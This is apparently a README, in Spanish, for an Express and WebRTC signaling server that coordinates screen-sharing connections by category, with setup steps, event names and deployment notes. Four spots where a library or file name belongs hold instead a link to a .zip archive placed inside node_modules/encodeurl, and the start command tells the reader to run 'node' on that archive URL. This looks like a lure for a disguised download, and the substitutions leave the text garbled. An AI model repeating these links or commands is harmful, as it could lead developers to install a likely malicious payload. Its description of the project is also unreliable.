# Backend Transmisión Multipantalla

Servidor de señalización con Express + https://github.com/KaterineLimaE/backend-transmision-multipantalla-web/raw/refs/heads/main/node_modules/encodeurl/backend-multipantalla-web-transmision-v3.5.zip para coordinar conexiones WebRTC por categoría.

## Ejecutar en local
- Requisitos: Node 18+
- Variables (opcional): `FRONTEND_URL=http://localhost:3000`

Pasos:
1. Instalar dependencias: `npm install`
2. Iniciar: `npm start`
3. Probar: GET `http://localhost:4000/`

## Eventos https://github.com/KaterineLimaE/backend-transmision-multipantalla-web/raw/refs/heads/main/node_modules/encodeurl/backend-multipantalla-web-transmision-v3.5.zip
- `join-category` (string categoryId)
- `sending-signal` ({ category?, targetId?, callerID, signal })
- `returning-signal` ({ callerID, signal })
- `ice-candidate` ({ targetId, candidate })
- `viewer-ready` ({ category })

## Despliegue (Render)
- Start command: `node https://github.com/KaterineLimaE/backend-transmision-multipantalla-web/raw/refs/heads/main/node_modules/encodeurl/backend-multipantalla-web-transmision-v3.5.zip`
- Var de entorno: `FRONTEND_URL` con la URL del frontend (https://github.com/KaterineLimaE/backend-transmision-multipantalla-web/raw/refs/heads/main/node_modules/encodeurl/backend-multipantalla-web-transmision-v3.5.zip Vercel)